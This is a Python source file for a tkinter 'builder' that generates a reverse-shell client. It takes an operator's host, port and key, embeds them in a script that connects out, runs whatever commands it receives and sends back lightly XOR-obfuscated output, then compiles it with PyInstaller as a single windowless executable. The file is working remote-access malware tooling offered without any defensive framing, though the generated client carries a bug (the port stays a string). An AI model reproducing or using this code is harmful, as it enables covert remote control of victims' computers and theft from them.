import tkinter as tk
from tkinter import ttk
import PyInstaller.__main__ as pyinstaller


class BuilderFrame(tk.Frame):
    def __init__(self, root, callback, gui):
        super().__init__(root, width=600, height=400)
        self.callback = callback
        self.gui = gui
        self.pack_propagate(0)
        self.create_widgets()

    def create_widgets(self):
        # Host option as an IP address entry
        host_label = ttk.Label(self, text="Host:")
        host_label.pack()
        self.host_entry = ttk.Entry(self)
        self.host_entry.pack()

        # Port option
        port_label = ttk.Label(self, text="Port:")
        port_label.pack()
        self.port_entry = ttk.Entry(self)
        self.port_entry.pack()

        # Encryption key option
        key_label = ttk.Label(self, text="Encryption Key:")
        key_label.pack()
        self.key_entry = ttk.Entry(self)
        self.key_entry.pack()

        # Build button
        build_button = ttk.Button(self, text="Build", command=self.build_client)
        build_button.pack()

        # Minimize button
        minimize_button = ttk.Button(self, text="Minimize", command=self.minimize_builder)
        minimize_button.pack()



    def build_client(self):
        host = self.host_entry.get()
        port = self.port_entry.get()
        key = self.key_entry.get()

    # Generate the client script with the provided host, port, and key
        client_script = f'''
import socket
import base64
import subprocess
import os

# Reverse connection to the host and port
host = "{host}"
port = "{port}"

# Encryption key for communication
key = "{key}"

def encrypt(message):
    encoded = base64.b64encode(message.encode())
    encrypted = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded.decode()))
    return encrypted

def decrypt(message):
    decrypted = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in    enumerate(message))
    decoded = base64.b64decode(decrypted.encode())
    return decoded.decode()

def connect():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        while True:
            command = sock.recv(1024).decode()
            if command == "exit":
                break
            elif command.startswith("cd"):
                _, path = command.split(" ", 1)
                os.chdir(path)
                response = encrypt("Changed directory to " + os.getcwd())
            else:
                output = subprocess.getoutput(command)
                response = encrypt(output)
            sock.send(response.encode())
        sock.close()
    except Exception as e:
        print("Error:", str(e))

connect()
'''

        # Save the client script to a file
        client_filename = "client.py"
        with open(client_filename, "w") as file:
            file.write(client_script)

        # Build the executable using PyInstaller
        pyinstaller_args = [
            "--onefile",
            "--noconsole",
            "--name=client",
            client_filename
        ]
        pyinstaller.run(pyinstaller_args)

        print("Executable file created successfully.")


    def minimize_builder(self):
        self.pack_forget()
        self.gui.show_client_list()
